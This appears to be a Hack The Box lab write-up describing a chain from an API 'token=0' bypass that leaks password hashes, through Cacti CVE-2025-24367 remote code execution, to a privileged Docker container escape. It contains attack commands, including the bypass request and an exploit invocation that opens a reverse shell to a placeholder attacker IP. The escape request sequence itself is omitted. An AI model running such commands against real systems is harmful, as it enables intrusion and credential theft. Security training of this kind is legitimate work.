---
title: "Container Monitoring Lab — API IDOR to Privileged Container Escape"
description: "An API access-control flaw exposes password hashes, and an unauthenticated Docker daemon allows a privileged container escape to host root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - docker
  - cacti
  - api
  - container-escape
---

## Summary

This Hack The Box lab runs network monitoring inside a Docker container. A broken access-control flaw in its API (`token=0` bypass) exposes MD5 password hashes for multiple users. After cracking the hashes and generating valid usernames from discovered full names, authenticated access is obtained. CVE-2025-24367 provides authenticated remote code execution within the container. The Docker daemon API is exposed without authentication on an internal network, allowing creation of a privileged container with the host filesystem mounted — yielding root on the underlying host.

## Context and Objective

The target is a Cacti monitoring instance deployed in Docker. Enumeration reveals an API endpoint that returns user data including MD5 password hashes when supplied with `token=0`. The objective is to leverage the exposed hashes to gain authenticated Cacti access, exploit a known vulnerability for container code execution, and escape to the host via the unprotected Docker API.

All IPs, credentials, and artifacts are replaced with role-based placeholders. The flags are omitted.

## Approach and Evidence

### Stage 1 — API IDOR and Hash Extraction

Rustscan identified open ports. Adding `<TARGET_HOSTNAME>` and `<APPLICATION_HOSTNAME>` to the hosts file resolved the virtual hosts.

The Cacti API endpoint at `/api/v1/user` accepts a `token` parameter. Setting `token=0` bypasses authentication entirely, returning user records without valid credentials:

```bash
curl -X GET "http://<TARGET>/api/v1/user?token=0&id=2"
```

Iterating IDs 1–1000 returned four user accounts with MD5 password hashes. The admin hash was cracked against a common wordlist, yielding the credential `admin:<ADMIN_PASSWORD>`.

### Stage 2 — Username Generation and Cacti Access

The application login page rejected `admin` as a username. The API also returned full names for each account. Using `username-anarchy` to generate username permutations from these full names, each permutation was tested against the application. The username `<VALID_APPLICATION_USER>` paired with the cracked password provided valid authentication.

```bash
./username-anarchy -i names.list > usernames.anarchy
```

Burp Intruder confirmed `<VALID_APPLICATION_USER>:<ADMIN_PASSWORD>` as the working credential.

### Stage 3 — CVE-2025-24367 (Cacti Authenticated RCE)

With valid Cacti credentials, CVE-2025-24367 was exploited to achieve code execution within the Docker container. The exploit established a reverse shell as `www-data` inside the container:

```bash
python3 exploit.py \
   -u '<VALID_APPLICATION_USER>' -p '<ADMIN_PASSWORD>' \
  -i '<ATTACKER_IP>' -l '<SHELL_PORT>' \
   --url 'http://<APPLICATION_HOSTNAME>'
```

The notes report successful exploitation returning a shell inside the container.

### Stage 4 — Docker API Exposure

Internal network reconnaissance from the container revealed the Docker daemon API exposed on TCP port 2375 at `<DOCKER_API_HOST>` without authentication:

```bash
curl -s http://<DOCKER_API_HOST>:2375/version | python3 -m json.tool
```

The response confirmed Docker was available. Listing available images identified a usable application image.

### Stage 5 — Privileged Container Escape

A container definition was submitted through the Docker API with privileged mode and a host-filesystem bind. The callback construction and API request sequence are omitted because they would be attack-ready.

Starting the container returned a root shell on the host with access to a protected file.

## Challenges and Decisions

The initial `admin` credential did not work for application login — the username did not match the application account. The full names discovered via the API enabled username generation, and systematic testing identified the correct application username. This highlighted the gap between API account names and application login usernames.

## Outcome

The attack chain succeeded: broken API access control → hash extraction → credential cracking → username generation → Cacti authentication → CVE-2025-24367 RCE → Docker API abuse → privileged container escape → root on host. The exposed Docker API is the critical misconfiguration that enabled full host compromise.

## Lessons and Recommendations

- **Never expose the Docker daemon API without authentication.** Binding the Docker daemon to TCP port 2375 without TLS client certificate authentication is unconditionally insecure. Use the Unix socket (`/var/run/docker.sock`) locally, or mutual TLS for remote access. Never mount `docker.sock` into containers.
- **Implement server-side validation for all API authentication tokens.** The `token=0` bypass indicates missing validation. Every API endpoint must verify the caller's identity server-side. Trivially bypassed token values must be rejected.
- **Patch Cacti promptly.** CVE-2025-24367 is a critical authenticated RCE. Cacti should be updated to the patched version, and access to the Cacti interface should be restricted to the management network.

## References

- CVE-2025-24367: Cacti Authenticated Remote Code Execution
